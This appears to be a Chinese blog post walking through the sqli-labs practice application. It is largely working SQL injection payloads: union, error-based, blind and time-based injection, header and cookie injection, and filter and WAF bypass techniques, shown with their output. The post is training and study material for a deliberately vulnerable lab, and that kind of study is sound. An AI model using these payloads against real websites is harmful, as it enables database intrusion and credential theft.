0,1\";\n\n\t?id=-1%df%27%20union%20select%201,version(),user()%23 成功\n\n- **less 37 POST - Bypass mysql_real_escape_string** </br>\n\t運' or 1=1 #\n\n---------------------------------------------------\n\nStacked injections:堆叠注入。从名词的含义就可以看到应该是一堆 sql 语句（多条）一起执 行。而在真实的运用中也是这样的，我们知道在 mysql 中，主要是命令行中，每一条语句结 尾加 ; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做stacked injection。 </br>\n原理:</br>\n在 SQL 中，分号（;）是用来表示一条 sql 语句的结束。试想一下我们在 ; 结束一个 sql 语句后继续构造下一条语句， 会不会一起执行？因此这个想法也就造就了堆叠注入。 而 union injection （联合注入） 也是将两条语句合并在一起， 两者之间有什么区别么？区别就在于 union 或者 union all 执行的语句类型是有限的， 可以用来执行查询语句， 而堆叠注入可以执行的是 任意的语句。 </br>\n局限:</br>\n堆叠注入的局限性在于并不是每一个环境下都可以执行， 可能受到 API 或者数据库引擎 不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。 </br>\n虽然我们前面提到了堆叠查询可以执行任意的 sql 语句，但是这种注入方式并不是十分 的完美的。在我们的 web 系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第 二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。\n因此，在读取数据时，我们建议使用 union（联合）注入。同时在使用堆叠注入之前， 我们也是需要知道一些数据库相关信息的，例如表名，列名等信息</br>\n\n暂不深入了解\n\n---------------------------------------------\nchallenge\n\n- **GET - challenge - Union -10 Queries Allowed - Variation1**</br>\n\t1.查表名</br>\n\t?id=-1%27%20union%20select%201,(select%20table_name%20from%20information_schema.tables%20where%20table_schema%3d%27challenges%27),3%20%23</br>\n\t得到此次的表名: 8TELU525VO</br>\n\t2.查列名 用concat一次性查完输出</br>\n\t?id=-1%27%20union%20select%201,(select%20group_concat(column_name ,%22---%22)%20from%20information_schema.columns%20where%20table_name%3d%228TELU525VO%22),3%20%23</br>\n\t返回:</br>\n  Your Login name:id---,sessid---,secret_63JY---,tryy---</br>\n\tYour Password:3</br>\n\t3.得到密码id,sessid,secret_63JY</br>\n\t?id=-1%27%20union%20select%20id,sessid,secret_63JY%20from%208TELU525VO%20%23</br>\n\t返回:</br>\n  Your Login name:856213ca887976a33e3d91b2c61fa65a</br>\n\tYour Password:M5ztHsC34iN2X0lzCiXJ27Cp</br>\n\t4.输入 M5ztHsC34iN2X0lzCiXJ27Cp 完成\n\n- **GET - Challenge - Union - 14 Queries Allowed - Variation 2**</br>\n\t1.猜测过滤规则</br>\n\t当输入?id=1)%26%26(1=1 时 成功 可知过滤为()</br>\n\t2.参考less 54</br>\n\t?id=-1)%20union%20select%201,(select%20table_name%20from%20information_schema.tables%20where%20table_schema%3d%27challenges%27),3%20%23</br>\n\t表名为: C73JPUKYS9\t</br>\n\t?id=-1)%20union%20select%201,(select%20group_concat(column_name ,%22---%22)%20from%20information_schema.columns%20where%20table_name%3d\n\t%22C73JPUKYS9%22),3%20%23</br>\n\t列名: Your Login name:id---,sessid---,secret_DH0J---,tryy---</br>\n\t?id=-1)%20union%20select%20id,sessid,secret_DH0J%20from%20C73JPUKYS9%20%23</br>\n\t密码：</br>\n  Your Login name: 4d0218b33a232f675d53381ef38b5370</br>\n  Your Password: kjbKG19I62vmYE3kS7gGN7qf </br> 成功\n\n- **GET - Challenge - Union - 14 Queries Allowed - Variation 3**</br>\n\t1.猜测</br>\n\t?id=1%27)%26%26(%271=1 成功 可知为(' ')</br>\n\t2.下面步骤如上</br>\n\n- **GET - Challenge - Union - 14 Queries Allowed - Variation 4**</br>\n\t如上\n\n- **GET - Challenge - Double Query -5 Queries Allowed - Variation 1**</br>\n\t1.猜测</br>\n\t?id=1%27%26%26%271=1 成功，可知为' '</br>\n\t?id=-1%27%20union%20select%201,(select%20table_name%20from%20information_schema.tables%20where%20table_schema%3d%27challenges%27),3%20%23 </br>  返回同上，可知有其它过滤规则</br>\n\t尝试报错注入</br>\n\t?id=-1%27%20union%20select%20updatexml(1,concat(0x7e,version(),0x7e),1)%23 成功返回version()</br>\n\t2.获取表名</br>\n\t?id=-1%27%20union%20select%201,updatexml(1,concat(0x7e,(select%20table_name%20from%20information_schema.tables%20where%20table_schema%3d%27challenges%27),0x7e),1),1%23</br>\n\t返回：XPATH syntax error: '~4HT916R6T1~'</br>\n\t3.获取列名</br>\n\t?id=-1%27%20union%20select%201,updatexml(1,concat(0x7e,(select%20group_concat(column_name%20,\"---\")%20from%20information_schema.columns%20where%20table_name%3d%20\"4HT916R6T1\"),0x7e),1),1%23</br>\n\t返回: XPATH syntax error: '~id---,sessid---,secret_EN0R---,'为什么有一个列没显示</br>\n\t4.获取密码</br>\n\t?id=-1%27%20union%20select%201,updatexml(1,concat(0x7e,(select%20secret_EN0R%20from%204HT916R6T1),0x7e),1),1%23</br>\n\t返回: XPATH syntax error: '~OcDGOovBkd3XMq3FpuSNtEIN~'</br>\n\n- **GET - Challenge - Double Query -5 Queries Allowed - Variation 2**</br>\n\t?id=1%26%261=1 返回成功，说明无字符</br>\n\t剩余步骤如 less 58</br>\n\n-  **GET - Challenge - Double Query -5 Queries Allowed - Variation 3**\n\t?id=1%22%26%26%221=1 猜测为 \" \"</br>\n?id=1%22)%26%26(%221=1 猜测为(\" \") </br>\n都返回相同结果？？？？</br>\n  但实际上\n        \t$id = '(\"'.$id.'\")';\n  \t\t\t$sql=\"SELECT * FROM security.users WHERE id=$id LIMIT 0,1\";\n  \t           if($row)\n  \t\t\t\t{\n  \t\t\t\t\techo '<font color= \"#00FFFF\">';\n  \t\t\t\t\t$unames=array(\"Dumb\",\"Angelina\",\"Dummy\",\"secure\",\"stupid\",\"superman\",\"batman\",\"admin\",\"admin1\",\"admin2\",\"admin3\",\"dhakkan\",\"admin4\");\n  \t\t\t\t\t$pass = array_reverse($unames);\n  \t\t\t\t\techo 'Your Login name : '. $unames[$row['id']];\n  \t\t\t\t\techo \"<br>\";\n  \t\t\t\t\techo 'Your Password : ' .$pass[$row['id']];\n  \t\t\t\t\techo \"</font>\";\n  \t\t\t\t}\n  \t\t\t\telse\n  \t\t\t\t{\n  \t\t\t\t\techo '<font color= \"#FFFF00\">';\n  \t\t\t\t\tprint_r(mysql_error());\n  \t\t\t\t\techo \"</font>\";  \n  \t\t\t\t}\n\t每次返回都是$unames=array（），奸诈！！\n\n- **GET - Challenge - Double Query -5 Queries Allowed - Variation 4**</br>\n\t$sql=\"SELECT * FROM security.users WHERE id=(('$id')) LIMIT 0,1\";\n\n- **GET - Challenge - Blind -130 Queries Allowed - Variation 1**</br>\n\t盲注了,该写脚本了，boolean或者延时,注意使用二分提高效率</br>\n\t?id=1%27)and If(ascii(substr((select group_concat(tabl e_name)%20from%20information_schema.tables%20where%20table_schema=%27challenges%2 7),1,1))=79,0,sleep(10))--+\n\n### 三.杂记\n\n- 盲注</br>\n\t语句执行完后没有回显</br>\n\t1.基于布尔</br>\n\t构造条件，有无界面显示来判断自己构造的消息是否正确（相当于猜测再验证，可以利用二分法提高效率）</br>\n\t2.基于报错</br>\n\tSELECT COUNT(SCHEMA_NAME) FROM information_schema.SCHEMATA GROUP BY CONCAT(VERSION(),FLOOR(RAND(0)\\*2));</br>\n\t[Err] 1062 - Duplicate entry '5.7.23-0ubuntu0.16.04.11' for key '<group_key>'</br>\n\t具体原理不懂，concat, floor, group by，rand(0)是关键</br>\n\t如果rand被禁用可以使用用户变量来报错？？</br>\n\t或者XPath报错等</br>\n\t3.基于时间-延迟注入</br>\n\t利用if,当条件正确或错误时，确定要不要sleep()来猜测</br>\n\n- insert/update/delete注入</br>\n\t思路：利用MYSQL对XML文档数据进行查询和修改的XPATH函数，进行报错回显</br>\n\n-\torder by</br>\n\t可以用来确定有几列，如 order by 4 ,报错没有第四列</br>\n\n- url编码\n  \t空格    -    %20\n  \t\"          -    %22\n  \t#         -    %23\n  \t%        -    %25\n  \t&         -    %26\n  \t(          -    %28\n  \t)          -    %29\n  \t+         -    %2B\n  \t,          -    %2C 逗号\n  \t/          -    %2F\n  \t:          -    %3A\n  \t;          -    %3B\n  \t<         -    %3C\n  \t=         -    %3D\n  \t>         -    %3E\n  \t?         -    %3F\n  \t@       -    %40\n  \t\\          -    %5C\n  \t|          -    %7C\n  \t'               %27  单引号\n\n- 补充一些数据库知识</br>\n  \tinfomation_shema这个数据库中保存了mysql服务器中的所有数据库信息。\n  \t如数据库名，数据库的表，表栏的数据类型与访问权限等。</br>\n  \t再简单点，这台MySQL服务器上，到底有哪些数据库、各个数据库有哪些表，\n  \t每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema里面。</br>\n\n  \tinformation_schema的表schemata中的列schema_name记录了所有数据库的名字\n  \tinformation_schema的表tables中的列table_schema记录了所有数据库的名字\n  \tinformation_schema的表tables中的列table_name记录了所有数据库的表的名字\n  \tinformation_schema的表columns中的列table_schema记录了所有数据库的名字\n  \tinformation_schema的表columns中的列table_name记录了所有数据库的表的名字\n  \tinformation_schema的表columns中的列column_name记录了所有数据库的表的列的名字\n查询指定数据库所有表名</br>\nSELECT table_name FROM information_schema.tables WHERE table_schema='数据库名';</br>\n查询mysql中所有数据库名字</br>\nSELECT schema_name FROM information_schema.schemata</br>\n\n\tversion()  mysql版本\n\tuser()用户\n\t@@datadir数据路径\n\t@@version_compile_os 操作系统\n\tdatabase() 数据库名字\n\tSELECT VERSION(), USER(), @@datadir, @@version_compile_os, DATABASE();\n--+/# 注释，一般用#，url编码为%23</br></br>\nmysql中XPath:</br>\nMySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数，分别是ExtractValue()和UpdateXML()</br>\nExtractValue():</br>\n\tEXTRACTVALUE (XML_document, XPath_string); </br>\n\t第一个参数：XML_document是String格式，为XML文档对象的名称</br>\n\t第二个参数：XPath_string (Xpath格式的字符串) </br>\n\t作用：从目标XML中返回包含所查询值的字符串</br>\nUpdateXml():</br>\n\tUPDATEXML (XML_document, XPath_string, new_value); </br>\n\t第一个参数：XML_document是String格式，为XML文档对象的名称</br>\n\t第二个参数：XPath_string (Xpath格式的字符串) </br>\n\t第三个参数：new_value，String格式，替换查找到的符合条件的数据 </br>\n\t作用：改变文档中符合条件的节点的值 </br>\n通常利用其显错来进行注入，例 updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</br>\n0x7E为~的ascii码</br></br>\nif</br>\nIF(expr1,expr2,expr3) 如果expr1为true返回expr2,否则返回expr3</br></br>\nconcat() 连接字符串，将多个连接在一起。</br>\n\tconcat(str1,str2,...)</br>\nconcat_ws() 将多个字符串连接在一起，可以一次性指定分隔符</br>\n\tconcat_ws(sparator, str1,str2,...)</br>\ngroup_concat() 将group by产生的同一个分组中的值连接起来，返回一个字符串结果</br>\n\tgroup_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc  ] [separator '分隔符'] )</br>\n\n\n\n\n\n- 问题：</br>\n1.怎么确定是哪种注入类型？</br>\n2.在没有返回值的情况下判断单引号双引号括号等\n\n- 其它\n  \t?id=1%27%26%26%271=1 猜测为’ ‘\n  \t?id=1%27)%26%26(%271=1 猜测为（’ ‘）\n  \t?id=1%22%26%26%221=1 猜测为 \" \"\n  \t?id=1%22)%26%26(%221=1 猜测为(\" \")\n  \t?id=1)%26%26(1=1  猜测为()\n  \t?id=1%26%261=1 无\n","source":"_posts/security/sql/sql注入.md","raw":"---\ntitle: sql-labs注入\ndate: 2018-08-28 11:30:20\ntags: [sql注入]\n---\n## SQL注入\nsql注入:利用现有程序，使之执行构造的payload.\n\n### 一. 环境搭建\n- ubuntu16.04虚拟机\n- 更新阿里源 apt-get update\n- 安装mysql apt-get install mysql-server mysql-client -y\n- 安装apache apt-get install apache2 -y\n- 安装git apt-get install git -y\n- 项目 cd /var/www && sudo git clone https://github.com/Audi-1/sqli-labs.git sqli-labs  \n- 更改项目的mysql配置文件为自己数据库\n- 现在在浏览器localhost/sqli-labs已经可以访问到了\n\n##### 问题\n- navicat连不上mysql </br>\n\t注释 /etc/mysql/mysql.cnf.d/mysqld.cnf 中bind 127.0.0.1</br>\n\t修改select user, host from user;  update user set host = \"%\" where host = 'localhost';  flush privileges;\n- php版本导致mysql_connect()废弃 </br>\n\t安装phpstorm 配置phpcgi  apt-get install php版本-cgi</br>\n\t降低版本到php5.6错误仍然在</br>\n\t第二天重启Phpstrom 打开网页，错误消失</br>\n  猜测是降低版本有效，但第一天有缓存</br>\n<!-- more -->\n### 二.sqli-labs\n参考了大牛的教程https://github.com/lcamry/sqli-labs/blob/master/mysql-injection.pdf\n\n- ** less1 GET-Error based - Single quotes - String </br> **\n\tphp中代码 SELECT * FROM users WHERE id='$id' LIMIT 0,1;\n\t%20 空格 %27 单引号 %3D 等于号</br>\n\t一：?id=(select%20id%20from%20users%20where%20username%20%3D\"admin\") 未成功  \t’$id' 注入被单引号包裹，将输入变成了字符串</br>\n\t二：?id='%20and%20username%3D%27admin 未成功 id=''这个条件未绕过\n\t想利用id=这个条件或者绕过这个条件</br>\n\t三：?id='%20or%20username%3D%27admin 成功</br>\n\t基于二，转换思路，利用or成功绕过</br>\n\t爆破数据库版本</br>\n\t?id=-1%27%20%20union%20select%201%2cversion()%2c3%23</br>\n\t？id=-1'  union select 1,version(),3#</br>\n\tunion必须列一样，所以1和3是为了保持三列\n\n- ** less 2 GET - Error based -Intiger based</br> **\n\tphp中代码 $sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";</br>\n\t$id未加引号过滤输入</br> ?id=(select%20id%20from%20users%20where%20username%20%3D\"admin\")成功注入\n\n- ** less 3 GET - Error based - single quotes with twist - string**</br>\n\tphp中代码 $sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\"; 用括号和单引号进行了过滤</br>\n\t思路：消除括号</br>\n\t?id=%27)or%20username%3D%27admin%27or%20(%27  成功\n\n\n- ** less 4  GET - Error based - Double Quotes - String ** </br>\n\tphp中代码</br>\n\t$id = '\"' . $id . '\"';</br>\n\t$sql=\"SELECT * FROM users WHERE id=($id) LIMIT 0,1\";</br>\n\t?id=%27)or%20username%3D%27admin%27or%20(%27 成功</br>\n\n    关于前四个less的一些心得：\n    \t1.找错误：\n    \t\t尝试着单引号，双引号，括号等特殊字符注入，如果有报错信息，多半就是该符号出问题\n    \t\t例：?id=\"\n    \t\t\t\t 返回You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\"\"\") LIMIT 0,1' at line 1\n    \t\t\t可以看出输入所在位置为（“输入”）\n    \t2.注入利用\n    \t\t通过union来执行自己想要的sql\n\n- ** less 5  GET - Double Injection - Single Quotes - String ** </br>\n双查询注入（双查询：select嵌套select）</br>\n\t输入?id=‘ 失败， use near 1  由此猜测为单引号</br>\n\t?id='%20or%20username%3D%27admin 成功 </br>\n\t但是sql执行结果前端并没有进行输出，怎么利用？</br>\n\n\t查询资料后发现：Double injection 双注入。一些研究人员发现，使用group by子句结合rand()函数以及像count（\\*）这样的聚合函数，在SQL查询时会出现错误，这种错误是随机产生的，这就产生了双重查询注入。</br>\n\t发现多查询几次会爆出duplicate entry的错误，且将我们需要的信息都爆出来了。（正常结果未返回显示，所以通过错误信息去获得我们想要的信息，有随机性，需要重复多次）</br>\n\tcount() 计数</br>\n\trand() 随机</br>\n\tgroup by 分组</br>\n\tfloor() 向下取整，舍弃小数部分</br>\n\n\t?id=-1%27%20union%20select%201%2c(select%20count(\\*)%20from%20information_schema.schemata%20group%20by%20concat(version()%2cfloor(rand(0)\\*2)))%2c3%20%23 成功</br>\n\tDuplicate entry '5.7.23-0ubuntu0.16.04.11' for key ''\n\t其中version(）是我们希望执行的函数，可以换成其它\n\n- ** less 6 GET - Double Injection - Double Quotes - String ** </br>\n\n\t?id=-1%22%20union%20select%201%2c(select%20count(\\*)%20from%\t\t20information_schema.schemata%20group%20by%20concat(version()%2cfloor(rand(0)\\*2)))%2c3%20%23 成功\n\n- ** less 7 GET - Dump into outfile - String ** </br>\n\t文件导入限制条件多，未成功\n\n- ** less 8 GET - Blind - Boolian Based - Single Quotes ** </br>\n\t?id=-1%27or%201%3d1%23 </br>\n\t利用二分与返回结果的正确与否，来猜测验证数据库内容\n\n- ** less 9 GET - Blind - Time Based - Single Quotes ** </br>\n\t?id=1%27%20and%20if(ascii(substr(database(),1,1))>116,%200,%20sleep(5))%20%23 </br>\n\t因为在这正确或者错误都是返回的\"you are in\" 所以不能区分 </br>\n  ![youarein](../../../images/security/sql/youarein.png)\n\t使用时间延迟，例子为判断数据库名字第一个字是否为s(ascii码为115)，要进行多次尝试\n\n- ** less 10 GET -Blind - Time Based - Double Quotes ** </br>\n\t?id=1\"%20and%20if(ascii(substr(database(),1,1))>116,%200,%20sleep(5))%20%23\n\n- ** less 11 POST - Error Based -Single Qoutes - String ** </br>\n\tusername:  \n      1.admin ' # admin用户</br>\n      2.adimn ' or 1=1 # 万能</br>\n      3. ' union select version(),1 # 等其它操作\n\tpasswd:\n    因为username已经用#将后面注释了，所以passwd随意输入\n\n- ** less 12 POST - Error Based - Double Quotes - String - with twist ** </br>\n将less11的单引号改为 “）\n\n- ** less 13 POST - Double Injection - Single quotes - String - with twist ** </br>\n\tusername:    ') union select (select count(\\*) from information_schema.schemata group by concat(version(),floor(rand(0)\\*2))),1 #</br>\n\t返回信息Duplicate entry '5.7.23-0ubuntu0.16.04.11' for key ''</br>\n\t另外这种有正确/错误提示的，都可以二分盲注来猜测验证\n\n- ** less 14 POST  - Double Injection - Double quotes - String ** </br>\n\tless13 ') 换为 ”\n\n- ** less 15 POST - Blind - Boolean/Time Based -Single Quotes ** </br>\n\tusername: ' or 1=1 # 登录成功 </br>\n\t思路：利用or/and/if sleep()等来进行猜测</br>\n\n- ** less 16 POST - Blind - Boolean/Time Based - Double Quotes - with twist ** </br>\n\t将less15 ' 换成 \")\n\n- ** less 17 POST - Update Query - Error Based - String ** </br>\n\t这里对用户名进行了过滤</br>\n\t利用报错进行注入输出 </br>\n\tuname=admin&passwd=11'and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&sub mit=Submit </br>\n\t输出结果XPATH syntax error: '~5.7.23-0ubuntu0.16.04.1~'</br>\n  报错注入基本都是利用XPath进行报错\n\t有必要去买本书来系统的看一下mysql各种函数\n\n- ** less 18 POST - Header Injection - Uagent field - Error Based ** </br>\n\t这里需要正确的账号密码才能进行注入，因为插入操作是在登录判断成功后</br>\n\tphp中语句：$insert=\"INSERT INTO \\`security\\`.\\`uagents\\` (\\`uagent\\`, \\`ip_address\\`, \\`username\\`) VALUES ('$uagent', '$IP', $uname)\";</br>其中$IP不好修改，$uname与$password进行了过滤，所以考虑$uagent</br>\n\t将User-Agent 修改为 ‘ or extractvalue(1,concat(0x7e,version())) or ’</br>\n\t返回结果：XPATH syntax error: '~5.7.23-0ubuntu0.16.04.1'\n\n- ** less 19 POST - Header Injection - Referer Field - Error Based ** </br>\n\t同less 18,进行了过滤，但执行了$insert=\"INSERT INTO \\`security\\`.\\`referers\\` (\\`referer\\`, \\`ip_address\\`) VALUES ('$uagent', '$IP')\";</br>\n\t其中：$uagent = $\\_SERVER['HTTP_REFERER'];</br>\n\t将Referer 修改为: 'or extractvalue(1,concat(0x7e,database())) or'</br>\n\t返回: XPATH syntax error: '~security'\n\n- ** less 20 POST - Cookie Injection - Uagent Field - Error Based ** </br>\n\t进行了过滤</br>\n\t$cookee = $\\_COOKIE['uname'];</br>\n\t$sql=\"SELECT * FROM users WHERE username='$cookee' LIMIT 0,1\";</br>\n\t流程是登录成功后产生cookie,此时修改cookie,进行注入(在chrome浏览器中使用tamper插件进行请求的拦截修改)</br>\n\t修改Cookie为： uname=-1' union select 1,(select version()),3 #</br>\n\t返回 ：\n           Your Login name:5.7.23-0ubuntu0.16.04.1\n\t\t   Your Password:3\n\t\t   Your ID:1\n\t也可以用MYSQL对XML文档数据进行查询和修改的XPATH函数，进行报错回显</br>\n\t uname=admin'and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))# </br>\n\t返回:Issue with your mysql: XPATH syntax error: '~/usr/~'\n\n- ** less 21 POST - Cookie Injection - Error Based - Base64 Encode - Single Quotes - String ** </br>\n\tsetcookie('uname', base64_encode($row1['username']), time()+3600);\n\t$sql=\"SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1\";</br>\n\t对Cookie 进行了 base64处理 </br>\n\tuname=LTEnKSB1bmlvbiBzZWxlY3QgMSwoc2VsZWN0IHZlcnNpb24oKSksMyAj\n\tuname=-1') union select 1,(select version()),3 #</br>\n\t返回：</br>\n  Your Login name:5.7.23-0ubuntu0.16.04.1</br>\n\t Your Password:3</br>\n\tYour ID:1\n\n- ** less 22 POST - Cookie Injection - Error Based - Base64 Encode - Double Quotes - String ** </br>\n\t对Cookie进行了base64编码，使用的双引号\n\n----------------------------------------------------------------------\n\n- ** less 23 GET - Error Based - Strip Comments ** </br>\n\tphp中处理：</br>\n\t$reg = \"/#/\";</br>\n\t$reg1 = \"/--/\";</br>\n\t$replace = \"\";</br>\n\t$id = preg_replace($reg, $replace, $id); //将$reg替换为$replace</br>\n\t$id = preg_replace($reg1, $replace, $id);</br>\n\t$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";</br>\n\t因为过滤了注释符号，所以自己添加引号来闭合,同样可以使用报错/延时注入等</br>\n\t?id=-1%27%20union%20select%201%2c(select%20version())%2c3%20%27</br>\n\t返回：</br>\n  Your Login name:5.7.23-0ubuntu0.16.04.1</br>\n\tYour Password:3\n\n- ** less 24 POST - Second Order Injection \\*Real treat\\* - Stored Injections ** </br>\n\t本关为二次注入的示范例。二次注入也称为存储型的注入，就是将可能导致 sql 注入的字符先存入到数据库中， 当再次调用这个恶意构造的字符时， 就可以触发 sql 注入</br>\n\tphp中:</br>\n      $sql = \"select count(\\*) from users where username='$username'\";\n\t\t  $res = mysql_query($sql) or die('You tried to be smart, Try harder!!!! :( ');\n\t\t  $sql = \"insert into users ( username, password) values(\\\"$username\\\", \\\"$pass\\\")\";\n\t\t  $sql = \"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' \";\n\t先注册一个admin'#用户，更改其密码，实际上是更改的admin的密码\n\n- **less 25 GET - Error Based - All your OR & AND Belong to us - String - Single Quotes**</br>\n\t$id= preg_replace('/or/i',\"\", $id);\t\t\t//strip out OR (non case sensitive)</br>\n\t$id= preg_replace('/AND/i',\"\", $id);\t\t//Strip out AND (non case sensitive)</br>\n\t$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";</br>\n\t思路：使用union\n\t绕过过滤：\n        （1）大小写变形 Or,OR,oR\n\t\t（2）编码，hex，urlencode\n\t\t（3）添加注释/*or*/\n\t\t（4）利用符号 and=&& or=||\n\t?id=1%27%20||%20%20extractvalue(1%2cconcat(0x7e%2cversion()))%23\n\t返回：XPATH syntax error: '~5.7.23-0ubuntu0.16.04.1'\n\n- **less 25a GET - Blind Based - All your OR & AND Belong to us - String - Single Quotes** </br>\n\t$id= blacklist($id);</br>\n\t$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";</br>\n\t//print_r(mysql_error()); </br>\n\t报错注入不能用，所以使用基于布尔的注入，其中and/or进行了过滤</br>\n\t?id=-1%20||%20if(ascii(substr(database(),1,1))%3d117,0,1)判断数据库名字第一个字符是不是u(users库)</br>\n  然后依次这样，查出数据库名\n\n- **less 26 GETs - Error Based - All your Spaces and Comments Belong to us** </br>\n\tComments 注释</br>\n\tphp中:</br>\n\t   function blacklist($id)\n\t    {\n\t\t$id= preg_replace('/or/i',\"\", $id);\t\t\t//strip out OR (non case sensitive)\n\t\t$id= preg_replace('/and/i',\"\", $id);\t\t//Strip out AND (non case sensitive)\n\t\t$id= preg_replace('/[\\/\\*]/',\"\", $id);\t\t//strip out /*\n\t\t$id= preg_replace('/[--]/',\"\", $id);\t\t//Strip out --\n\t\t$id= preg_replace('/[#]/',\"\", $id);\t\t\t//Strip out #\n\t\t$id= preg_replace('/[\\s]/',\"\", $id);\t\t//Strip out spaces\n\t\t$id= preg_replace('/[\\/\\\\\\\\]/',\"\", $id);\t\t//Strip out slashes\n\t\treturn $id;\n\t   }\n\t$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";</br>\n\t思路：</br>\n  注释过滤了可以手动闭合引号，空格过滤\n\t可以使用  %a0  换行，</br>\n  /\\**/ 注释， （） 括号等绕过空格</br>\n\t此处注释不能使用，为了使用select时去掉末尾引号，空格也不行</br>\n\tid='111'union(select(1),(version()),(3)） ' LIMIT 0,1; 使用括号时，引号还在</br>\n\t?id=111%27union%a0select%a01%2cversion()%2c3||%271使用换行成功\n\n- **less 26a  GET - Blind Based - All your SPACES And COMMENTS Belong to us - Quotes-Parenthesis** </br>\n\t过滤和less26相同</br>\n\t$sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\";</br>\n\t?id=111%27)union%a0select%a01%2cversion()%2c3||(%271</br>\n\n\t思考：在盲注时，我们不知道进行了哪些过滤，可以构造特殊payload,如果返回原结果，则说明是我们所猜测的 %26为&</br>\n\t?id=1%27%26%26%271=1 猜测为’ ‘</br>\n\t?id=1%27)%26%26(%271=1 猜测为（’ ‘）</br>\n\t?id=1%22%26%26%221=1 猜测为 \" \"</br>\n\t?id=1%22)%26%26(%221=1 猜测为(\" \")</br>\n\t?id=1)%26%26(1=1  猜测为()</br>\n\t?id=1%26%261=1 无</br>\n等诸如此类</br>\n\n- **less 27 GET - Error Based - All your UNION & SELECT Belong to us - String - Single Quotes**</br>\n  \tfunction blacklist($id)\n  \t{\n  \t$id= preg_replace('/[\\/\\*]/',\"\", $id);\t\t//strip out /*\n  \t$id= preg_replace('/[--]/',\"\", $id);\t\t//Strip out --.\n  \t$id= preg_replace('/[#]/',\"\", $id);\t\t\t//Strip out #.\n  \t$id= preg_replace('/[ +]/',\"\", $id);\t    //Strip out spaces.\n  \t$id= preg_replace('/select/m',\"\", $id);\t    //Strip out spaces.\n  \t$id= preg_replace('/[ +]/',\"\", $id);\t    //Strip out spaces.\n  \t$id= preg_replace('/union/s',\"\", $id);\t    //Strip out union\n  \t$id= preg_replace('/select/s',\"\", $id);\t    //Strip out select\n  \t$id= preg_replace('/UNION/s',\"\", $id);\t    //Strip out UNION\n  \t$id= preg_replace('/SELECT/s',\"\", $id);\t    //Strip out SELECT\n  \t$id= preg_replace('/Union/s',\"\", $id);\t    //Strip out Union\n  \t$id= preg_replace('/Select/s',\"\", $id);\t    //Strip out select\n  \treturn $id;\n  \t}\n\n\t$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";</br>\n\n\t思路一：大小写绕过</br>\n\t?id=111%27%a0uNioN%a0sElEct%a01,version(),3%a0%27</br>\n\t思路二：报错或延时？\n\n- **less 27a GET - Blind Based - All your UNION & SELECT Belong to us -Double Quotes**</br>\n\t1.?id=1%22%26%26%221=1 成功，猜测为“ \"过滤</br>\n\t2.?id=111%22%a0uNioN%a0sElEct%a01,version(),3%a0%22成功注入</br>\n\n- **less 28 GET - Error Based - All your UNION & SELECT Belong to us - String - Single Quotes with Parentesis**</br>\n  \tfunction blacklist($id)\n  \t{\n  \t$id= preg_replace('/[\\/\\*]/',\"\", $id);\t\t\t\t//strip out /*\n  \t$id= preg_replace('/[--]/',\"\", $id);\t\t\t\t//Strip out --.\n  \t$id= preg_replace('/[#]/',\"\", $id);\t\t\t\t\t//Strip out #.\n  \t$id= preg_replace('/[ +]/',\"\", $id);\t    \t\t//Strip out spaces.\n  \t$id= preg_replace('/select/m',\"\", $id);\t   \t\t \tStrip out spaces.\n  \t$id= preg_replace('/[ +]/',\"\", $id);\t    \t\t//Strip out spaces.\n  \t$id= preg_replace('/union\\s+select/i',\"\", $id);\t    //Strip out UNION & SELECT.\n  \treturn $id;\n  \t}\n\t   $sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\";\n\t?id=111%27)%a0uNioN%a0sElEct%a01,version(),3%a0||(%27\n\n  - **less 28a GET - Error Based - All your UNION & SELECT Belong to us - String - Single Quotes - Parentesis**</br>\n    \tfunction blacklist($id)\n    \t{\n    \t$id= preg_replace('/union\\s+select/i',\"\", $id);\t    //Strip out spaces.\n    \treturn $id;\n    \t}\n    \t$sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\";\n\t?id=111%27)%a0uNioN%a0sElEct%a01,version(),3%a0||(%27   与less28相同\n\n- **less 29 GET Error Based - IMPIDENCE MISMATCH - Having a WAF in Front of Web Application**</br>\n服务器（两层架构）</br>\n\t当?id=1&id=2， apache（php）解析最后一个参数，即显示 id=2 的内容。Tomcat（jsp）解析第 一个参数，即显示 id=1 的内容</br>\n\t此处应该返回id=2 的内容，因为时间上提供服务的是 apache（php）服务器， 返回的数据也应该是 apache 处理的数据。 而在我们实际应用中， 也是有两层服务器的情况， 那为什么要这么做？是因为我们往往在 tomcat 服务器处做数据过滤和处理，功能类似为一 个 WAF。而正因为解析参数的不同，我们此处可以利用该原理绕过 WAF 的检测。该用法就 是 HPP（HTTP Parameter Pollution），http 参数污染攻击的一个应用。HPP 可对服务器和客 户端都能够造成一定的威胁。 </br>\n\t?id=1&id=-2%27union%20select%201,user(),version()%27</br>\n\t返回:</br>\n  Your Login name:root@localhost</br>\n\tYour Password:5.7.23-0ubuntu0.16.04.1\n\n- **less 30 GET Blind - IMPIDENCE MISMATCH - Having a WAF in Front of Web**</br>\n\t?id=1&id=-2%22union%20select%201,user(),version()%22\n\n- **less 31 GET Blind - IMPIDENCE MISMATCH - Having a WAF in Front of Web** </br>\n\t?id=1&id=-2\")union%20select%201,user(),version()%23\n\n- **less 32 GET - Bypass Custom Filter Adding Slashes to Dangerous 